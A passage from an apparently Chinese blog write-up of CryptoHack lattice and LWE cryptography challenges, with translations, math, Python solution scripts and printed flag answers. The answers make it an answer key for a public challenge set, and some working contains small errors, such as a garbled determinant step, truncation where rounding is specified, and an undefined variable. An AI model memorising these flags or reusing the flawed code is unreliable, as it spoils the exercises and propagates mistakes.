mode=display">F(v_1,...,v_n)=t_1v_1+t_2v_2+...+t_nv_n:0≤t_i<1</script><ul><li>还是以二维几何空间为例子，二维平面中格的基本域就是以基向量$u_1、u_2$为边长的平行四边形。</li><li>我们可以通过格的基向量，计算基本域的体积。仍然使用二维几何空间为例子，有基向量$v=(2,5)$，$u=(3,1)$。可以构成一个矩阵，这个矩阵的行由基向量的坐标构成：$A=\pmatrix{2&amp;5\3&amp;1}$，从而这个基本域的体积为矩阵$A$行列式的大小（也就是行列式的绝对值）</li></ul><script type="math/tex; mode=display">vol(F)=|det(A)|=||2*1-5*3||=||2-15||=13</script><ul><li>对于本题的flag，就是计算一个格基本域的体积，给出格基$v_1=(6,2,-3),v_2=(5,1,4),v_3=(2,7,1)$，计算该基生成格的基本域体积。</li><li>e该基构成了一个矩阵$A=\begin{bmatrix}6 &amp; 2&amp; -3\5 &amp; 1 &amp;4\2 &amp; 7 &amp; 1\end{bmatrix}$，下面就是计算该行列式的过程：</li></ul><script type="math/tex; mode=display">\begin{array}{l}vol(F)\\=||det(A)||\\=||6*1*1+2*4*2+(-3)*5*7-(-3)*1*2-6*4*7-1*5*2||\\=||6+16-105+6-168-10||\\=||22-99-178||\\=255\end{array}</script><h2 id="题目5_gaussian-reduction"><a href="#题目5-Gaussian-Reduction" class="headerlink" title="题目5_Gaussian Reduction"></a>题目5_Gaussian Reduction</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124185852361.png" alt="image-20251124185852361"></p><p>翻译过来如下：</p><ul><li>如果你仔细观察，格在密码学中无处不在。有时他们通过某个密码系统通过代数操作显现出来的，用来攻破那些没有被安全地生成的参数。最著名的例子就是<code>Coppersmith</code>针对RSA的攻击。</li><li>格也通过两个基本的格困难问题，也可以用来建造密码学协议，这两个基本的格困难问题如下：<ul><li>最短向量问题（SVP）：找到格$L$中最短的非零向量。即找到非零向量$v\in L$，使得$||v||$最小。</li><li>最近向量问题（CVP）：有一个不在格上的向量$w\in R^{m}$,找到一个格中的向量，使得该向量距离$w$，最近。即找到向量$v\in L$，使得$||v-w||$最小。</li></ul></li><li>SVP对于通用格来说是比较困难的，但是对于足够简单的情况，有高效的算法能够计算SVP的解或者近似解。当格的维数为四或更小时，我们可以在多项式时间内精确计算出最短向量。但是对于更高维度的格，我们只能得到其近似值。</li><li>高斯发明了一个算法，该算法是用于二维格，给定任意一个格基，寻找二维格中的最优基，此外该算法输出结果中的向量$v_1$是$L$中的最短非零向量，因此解决了SVP问题。</li></ul><blockquote><p>对于高维格来说，有一种格基规约算法该算法被称为<code>LLL</code>算法，它是以<code>Lenstra</code>、<code>Lenstra</code>、<code>Lovász</code>这三个人名字的首字母命名的。如果你经常玩CTF，那你已经早就知道它了。LLL算法运行在多项式时间内。不过现在我们依然在二维空间中讨论问题。</p></blockquote><ul><li>高斯算法大致通过从一个基向量的倍数中减去另一个向量，直到无法让基向量变小。由于这个算法用于二维空间的，所以该算法是很容易可视化的。下面这个伪代码是高斯算法的具体过程，来源于<code>Jeffrey Hoffstein</code>、<code>Jill Pipher</code>、<code>Joseph H. Silverman</code>写的这本<code>《An Introduction to Mathematical Cryptography》</code></li></ul><script type="math/tex; mode=display">\begin{array}{l}Loop\\~~~~(a) If ||v_2||<||v_1||,swap~v_1,v_2 \\~~~~(b) Compute~m=⌊\frac{v_1⋅v_2}{v_1·v_1}⌉ \\~~~~(c) If~~~m=0, return~v_1,v_2 \\~~~~(d) v_2=v_2-m·v_1\\Continue Loop\end{array}</script><blockquote><p>注意：高斯算法与欧几里得的GCD算法中<code>swap</code>和<code>reduction</code>步骤有比较相似的地方，并且我们必须对浮点数进行四舍五入，因为格上我们只能使用整数系数作为基向量。</p></blockquote><ul><li>本题的flag是，使用高斯算法找到两个向量$v=(846835985,9834798552),u=(87502093,123094980)$的正交基，flag是使用算法找到的正交基的内积。</li></ul><p>编写如下算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vec_multi</span>(<span class="params">u1:<span class="built_in">list</span>,v1:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param u1: 进行内积的向量之一</span></span><br><span class="line"><span class="string">    :param v1: 进行内积的向量之一</span></span><br><span class="line"><span class="string">    :return: 内积的结果,float或int类型</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(u1)</span><br><span class="line">    <span class="keyword">assert</span> length == <span class="built_in">len</span>(v1) <span class="comment"># 判断两个向量必须是相同维数的</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        result += u1[i]*v1[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vec_sub</span>(<span class="params">u1:<span class="built_in">list</span>,v1:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param u1: 被减向量</span></span><br><span class="line"><span class="string">    :param v1: 减向量</span></span><br><span class="line"><span class="string">    :return: vec:list: 向量减法的结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    length = <span class="built_in">len</span>(u1)</span><br><span class="line">    <span class="keyword">assert</span> length == <span class="built_in">len</span>(v1) <span class="comment"># 判断两个向量必须是相同维数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        result.append(u1[i]-v1[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vec_times</span>(<span class="params">k:<span class="built_in">int</span> <span class="keyword">or</span> <span class="built_in">float</span>,u1</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param k: 数乘的值</span></span><br><span class="line"><span class="string">    :param u1: 数乘向量</span></span><br><span class="line"><span class="string">    :return: vec: 返回结果向量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(u1)):</span><br><span class="line">        result.append(k*u1[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gaussian_reduction</span>(<span class="params">v1:<span class="built_in">list</span>,v2:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用高斯规约法计算出给定二维格的最短向量</span></span><br><span class="line"><span class="string">    :param basis: 传入的是一个基,v1=[1,2],v2=[3,4]</span></span><br><span class="line"><span class="string">    :return: 返回(v1,v2)大致形式如下:([1,1],[0,1])</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> vec_multi(v2,v2) &lt; vec_multi(v1,v1):</span><br><span class="line">        v1,v2 = v2,v1</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">int</span>(vec_multi(v1,v2)/vec_multi(v1,v1))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> m:<span class="comment"># 这个地方就有点像欧几里得辗转相除法余数为0停止，而这里是一个向量在另一个向量的投影为0停止(投影为0即正交)</span></span><br><span class="line">        v2 = vec_sub(v2,vec_times(m,v1))</span><br><span class="line">        <span class="keyword">if</span> vec_multi(v2, v2) &lt; vec_multi(v1, v1):</span><br><span class="line">            v1, v2 = v2, v1</span><br><span class="line">        m = <span class="built_in">int</span>(vec_multi(v1, v2) / vec_multi(v1, v1))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v1,v2</span><br><span class="line"></span><br><span class="line">v1 = [<span class="number">846835985</span>,<span class="number">9834798552</span>]</span><br><span class="line">v2 = [<span class="number">87502093</span>,<span class="number">123094980</span>]</span><br><span class="line">v1,v2 = Gaussian_reduction(v1,v2)</span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"><span class="built_in">print</span>(vec_multi(v1,v2))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[87502093, 123094980]</span></span><br><span class="line"><span class="string">[-4053281223, 2941479672]</span></span><br><span class="line"><span class="string">7410790865146821</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="题目6_find-the-lattice"><a href="#题目6-Find-the-Lattice" class="headerlink" title="题目6_Find the Lattice"></a>题目6_Find the Lattice</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124205007282.png" alt="image-20251124205007282"></p><p>翻译如下：</p><ul><li>正如我们所见，格中的困难问题能在密码系统中构成一个门限函数。我们也发现在密码分析学中，格能攻击那些一开始看起来与格无关的密码学协议。</li><li>这个挑战使用模运算去加密<code>flag</code>，但是在这个协议中隐藏了一个二维的格。我们非常推荐花时间在这个挑战中以及你使用格能怎样破解它。</li><li>这题是一个非常著名的例子，关于它的资料非常丰富，但是在一个密码系统中找到隐藏的格经常是破解该密码系统的一个关键。</li></ul><p>接下来就是一个带附件的题目了，先来看看该附件的<code>source.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;crypto&#123;?????????????????????&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 该函数用于创建密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    q = getPrime(<span class="number">512</span>) <span class="comment"># 生成一个随机素数q</span></span><br><span class="line">    upper_bound = <span class="built_in">int</span>(math.sqrt(q // <span class="number">2</span>)) <span class="comment"># 设置上界</span></span><br><span class="line">    lower_bound = <span class="built_in">int</span>(math.sqrt(q // <span class="number">4</span>)) <span class="comment"># 设置下界</span></span><br><span class="line">    f = random.randint(<span class="number">2</span>, upper_bound) <span class="comment"># 在(2,上界)之间生成一个随机数f</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(lower_bound, upper_bound) <span class="comment"># 在(下界,上界)之间生成一个随机数g</span></span><br><span class="line">        <span class="keyword">if</span> math.gcd(f, g) == <span class="number">1</span>: <span class="comment"># 要求(f,g)互素</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (inverse(f, q)*g) % q <span class="comment"># 计算h = f^&#123;-1&#125;*g % p</span></span><br><span class="line">    <span class="keyword">return</span> (q, h), (f, g) <span class="comment"># 返回的是(h,g),(f,g)密钥对</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现加密操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">q, h, m</span>):</span><br><span class="line">    <span class="keyword">assert</span> m &lt; <span class="built_in">int</span>(math.sqrt(q // <span class="number">2</span>))</span><br><span class="line">    r = random.randint(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(q // <span class="number">2</span>)))</span><br><span class="line">    e = (r*h + m) % q</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">q, h, f, g, e</span>):</span><br><span class="line">    a = (f*e) % q</span><br><span class="line">    m = (a*inverse(f, g)) % g</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public, private = gen_key()</span><br><span class="line">q, h = public</span><br><span class="line">f, g = private</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line">e = encrypt(q, h, m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Public key: <span class="subst">&#123;(q,h)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Encrypted Flag: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目7_backpack-cryptography"><a href="#题目7-Backpack-Cryptography" class="headerlink" title="题目7_Backpack Cryptography"></a>题目7_Backpack Cryptography</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124201455993.png" alt="image-20251124201455993"></p><p>翻译如下：</p><p>我非常喜欢这个密码系统，我把它放背包中并且随身携带它。为了减轻负担，我确保背包的密度不会太高。</p><h1 id="lwe1"><a href="#LWE1" class="headerlink" title="LWE1"></a>LWE1</h1><h2 id="题目1_lwe-background"><a href="#题目1-LWE-Background" class="headerlink" title="题目1_LWE Background"></a>题目1_LWE Background</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251130162438850.png" alt="image-20251130162438850"></p><p>翻译过来就为：</p><blockquote><p>在开始这部分之前，你应该至少完成”格”上面格部分。</p></blockquote><p>通过<code>CryptoHack</code>中RSA章节部分，使用LLL算法进行格基规约已经证明了是一个非常强有力的密码分析学工具。它在SVP和CVP或BDD问题中找到一个短向量表现是非常出色的。</p><p>然而，对于LWE的格基规约算法仅仅使用在某一个点。通过使格的维数或者误差变大，或者提供一个大的或混淆的基底，格基规约将不再返回格中的最短向量。这就是使得LWE称为密码学中的困难问题的原因。</p><p>哪一个计算机科学和数学家在2005年提出了LWE问题？本题的flag的值就是该科学家的名字。</p><p>来源：<a href="https://static.aminer.org/pdf/PDF/000/570/324/the_two_faces_of_lattices_in_cryptology.pdf">the_two_faces_of_lattices_in_cryptology.pdf</a></p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251130163943460.png" alt="image-20251130163943460"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oded Regev</span><br></pre></td></tr></table></figure><h2 id="题目2_lwe-intro"><a href="#题目2-LWE-Intro" class="headerlink" title="题目2_LWE Intro"></a>题目2_LWE Intro</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251130165042407.png" alt="image-20251130165042407"></p><p>翻译过来为：</p><p>LWE指的是一个计算问题，在已知大量带噪声的样本的情况下，去学习一个在线性环上取值的线性函数$f(\mathbf{A})$</p><p>这些样本看起来像这样的一对$(\mathbf{A},&lt;\mathbf{A,S}&gt;+e)$，这里的$\mathbf{S}$是定义在这个线性函数上的秘密元素，而这个$\mathbf{e}$是来自某个已知分布的<code>小噪声</code>误差项，而$\mathbf{A}$是环中的一个已知元素。记$&lt;\mathbf{A,S}&gt;$为一个矩阵$\mathbf{A}$与向量$\mathbf{S}$相乘的结果。</p><p>基于LWE的密码系统种类非常多，但是他们通常由以下几个特征：</p><blockquote><ul><li>它们在两个不同的模数下进行模算数，一个是明文模数，另一个是密文模数。</li><li>密钥是模<code>n</code>的某个向量空间中的元素。</li><li>消息的加密方式是：将编码后的带噪声消息加入到一个大的点积结果中。</li></ul></blockquote><p>带噪声的消息，是将原消息与一个小的误差（或噪声）项适当编码后得到的和。</p><p>这个点积是密钥与向量空间的一个随机元素之间的点积，而这个随机元素会作为密文的一部分提供。</p><p>这样就像$(\mathbf{A},&lt;\mathbf{A,S}&gt;+encoded(m,e))$，这里的A是一个向量空间的元素。</p><p>如果密钥已知，那么就可以将点积消去，只剩下编码后的消息与噪声。由于消息与噪声采用了特殊的编码方式，噪声可以从编码中被去除，从而只留下原始消息。</p><p>在LWE系统中，有两种常见的方法来存放消息与噪声：要么把消息存放在LWE样本的高位，把噪声放在低位，要么反过来存放。</p><blockquote><ul><li>将一些消息存放在高位的LWE加密方案例子包括<code>Regev09</code>和<code>BFV</code></li><li>将消息存放在低位的LWE加密方案的一个例子是<code>BGV</code></li></ul></blockquote><p>如果没有加入误差，哪种算法可以在多项式时间内从这些线性方程组中恢复消息。本题的flag就是该算法的名称</p><ul><li>答案是高斯消元法，英文就是：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gaussian elimination</span><br></pre></td></tr></table></figure><h2 id="题目3_lwe-high-bits-message"><a href="#题目3-LWE-High-Bits-Message" class="headerlink" title="题目3_LWE High Bits Message"></a>题目3_LWE High Bits Message</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251130200257821.png" alt="image-20251130200257821"></p><p>翻译过来如下：</p><p>现在我们将手动解密一个示例LWE系统中的消息，这个消息被隐藏在高位中。</p><blockquote><p>该LWE加密系统参数如下：</p><ul><li>一个n维的向量空间</li><li>密文模数<code>q</code></li><li>明文模数<code>p</code>（需要满足加密的消息<code>m &lt; p</code>）</li><li>缩放因子$\Delta≈\frac{q}{p}$</li></ul><p>密钥：</p><ul><li>密钥$\mathbf{S}$是一个向量空间$\Z^{n}_p$的随机元素</li></ul><p>密文：</p><ul><li>密文是由一对$(\mathbf{A},b)$构成，其中$\mathbf{A}$是向量空间$Z^{n}_q$的一个元素，并且$b$是$Z_q$的一个元素。</li></ul><p>加密消息m：</p><ul><li>样本$\mathbf{A}$是向量空间$Z^{n}_q$的一个随机元素</li><li>对误差项$e$进行采样，它是一个位于区间$[-\frac{\Delta}{2},\frac{\Delta}{2}]$内的一个整数。（注意：实际中误差通常从离散高斯分布中采样，但使用均匀分布也可以）</li><li>计算$b=&lt;\mathbf{A,S}&gt;+\Delta·m+e$（注意这里没有模数，并且这里$<a,s>$是点乘）</a,s></li><li>返回$(\mathbf{A},b)$</li></ul><p>解密消息$(\mathbf{A},b)$：</p><ul><li>计算$x=b-&lt;\mathbf{A,S}&gt;~mod(~q)$，将$x$作为一个整数来理解（而不是模<code>q</code>意义下的值）</li><li>计算$m=round(\frac{x}{\Delta})$，此时除法运算是在整数上进行的。</li><li>返回m</li></ul></blockquote><p>在这个系统中，解密之所以可行，是因为在去掉掩码$&lt;\mathbf{A,S}&gt;$之后，剩下的带噪声的消息方程为：$\Delta·m+e$，是在整数域上成立的，因此不会因为模<code>q</code>而发生回绕。</p><p>因此，可以通过对整数除法进行四舍五入来去除误差项$e$，这要求参数的选择满足$\Delta·m+e&lt;\frac{q}{2}$</p><ul><li>接下来给出与本次挑战相关的代码文件和密文，代码如下，flag为m的值：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dimension</span></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="comment"># plaintext modulus</span></span><br><span class="line">p = <span class="number">257</span></span><br><span class="line"><span class="comment"># ciphertext modulus</span></span><br><span class="line">q = <span class="number">0x10001</span></span><br><span class="line"><span class="comment"># bound for error term</span></span><br><span class="line">error_bound = <span class="built_in">int</span>(floor((q/p)/<span class="number">2</span>))</span><br><span class="line"><span class="comment"># message scaling factor</span></span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">round</span>(q/p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">V = VectorSpace(GF(q), n)</span><br><span class="line">S = V.random_element()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S = &quot;</span>, S, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">m = ?</span><br><span class="line"></span><br><span class="line">A = V.random_element()</span><br><span class="line">error = randint(-error_bound, error_bound)</span><br><span class="line">b = A * S + m * delta + error <span class="comment"># 虽然最后没有取模，但是A*S这里会存在取模操作，因为这个是在有限域q中操作的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A = &quot;</span>, A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实本题考察的就是上面的加密和解密过程，只不过要注意的是$<a,s>$在这里是数乘，所以解密脚本如下：</a,s></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">S =  (<span class="number">55542</span>, <span class="number">19411</span>, <span class="number">34770</span>, <span class="number">6739</span>, <span class="number">63198</span>, <span class="number">63821</span>, <span class="number">5900</span>, <span class="number">32164</span>, <span class="number">51223</span>, <span class="number">38979</span>, <span class="number">24459</span>, <span class="number">10936</span>, <span class="number">17256</span>, <span class="number">20215</span>, <span class="number">35814</span>, <span class="number">42905</span>, <span class="number">53656</span>, <span class="number">17000</span>, <span class="number">1834</span>, <span class="number">51682</span>, <span class="number">43780</span>, <span class="number">22391</span>, <span class="number">33012</span>, <span class="number">61667</span>, <span class="number">37447</span>, <span class="number">16404</span>, <span class="number">58991</span>, <span class="number">61772</span>, <span class="number">44888</span>, <span class="number">43199</span>, <span class="number">32039</span>, <span class="number">26885</span>, <span class="number">17206</span>, <span class="number">62186</span>, <span class="number">58387</span>, <span class="number">57048</span>, <span class="number">38393</span>, <span class="number">29306</span>, <span class="number">58001</span>, <span class="number">57199</span>, <span class="number">33472</span>, <span class="number">56572</span>, <span class="number">53429</span>, <span class="number">62593</span>, <span class="number">14134</span>, <span class="number">40522</span>, <span class="number">25106</span>, <span class="number">34325</span>, <span class="number">37646</span>, <span class="number">43688</span>, <span class="number">14259</span>, <span class="number">24197</span>, <span class="number">33427</span>, <span class="number">43977</span>, <span class="number">18322</span>, <span class="number">38877</span>, <span class="number">55093</span>, <span class="number">12466</span>, <span class="number">16869</span>, <span class="number">25413</span>, <span class="number">54773</span>, <span class="number">59532</span>, <span class="number">62694</span>, <span class="number">13948</span>) </span><br><span class="line">A =  (<span class="number">13759</span>, <span class="number">12750</span>, <span class="number">38163</span>, <span class="number">63722</span>, <span class="number">39130</span>, <span class="number">22935</span>, <span class="number">58866</span>, <span class="number">48803</span>, <span class="number">15933</span>, <span class="number">64995</span>, <span class="number">60517</span>, <span class="number">64302</span>, <span class="number">42432</span>, <span class="number">32000</span>, <span class="number">22058</span>, <span class="number">58123</span>, <span class="number">53993</span>, <span class="number">33790</span>, <span class="number">35783</span>, <span class="number">61333</span>, <span class="number">53431</span>, <span class="number">43016</span>, <span class="number">60795</span>, <span class="number">25781</span>, <span class="number">28091</span>, <span class="number">11212</span>, <span class="number">64592</span>, <span class="number">11385</span>, <span class="number">24690</span>, <span class="number">40658</span>, <span class="number">35307</span>, <span class="number">63583</span>, <span class="number">60365</span>, <span class="number">60359</span>, <span class="number">32568</span>, <span class="number">35417</span>, <span class="number">22078</span>, <span class="number">38207</span>, <span class="number">16331</span>, <span class="number">53636</span>, <span class="number">28734</span>, <span class="number">30436</span>, <span class="number">18170</span>, <span class="number">15939</span>, <span class="number">966</span>, <span class="number">48519</span>, <span class="number">41621</span>, <span class="number">36371</span>, <span class="number">41836</span>, <span class="number">4026</span>, <span class="number">33536</span>, <span class="number">57062</span>, <span class="number">52428</span>, <span class="number">59850</span>, <span class="number">476</span>, <span class="number">43354</span>, <span class="number">61614</span>, <span class="number">32243</span>, <span class="number">42518</span>, <span class="number">19733</span>, <span class="number">63464</span>, <span class="number">29357</span>, <span class="number">56039</span>, <span class="number">15013</span>)</span><br><span class="line">b =  <span class="number">44007</span></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(S)):</span><br><span class="line">    s += A[i]*S[i]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">p = <span class="number">257</span></span><br><span class="line">q = <span class="number">0x10001</span></span><br><span class="line">x = <span class="built_in">int</span>((b - s) % q)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">round</span>(q/p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(x/delta)))</span><br><span class="line"><span class="comment"># 201</span></span><br></pre></td></tr></table></figure><h2 id="题目4_lwe-low-bits-message"><a href="#题目4-LWE-Low-Bits-Message" class="headerlink" title="题目4_LWE Low Bits Message"></a>题目4_LWE Low Bits Message</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251130200326392.png" 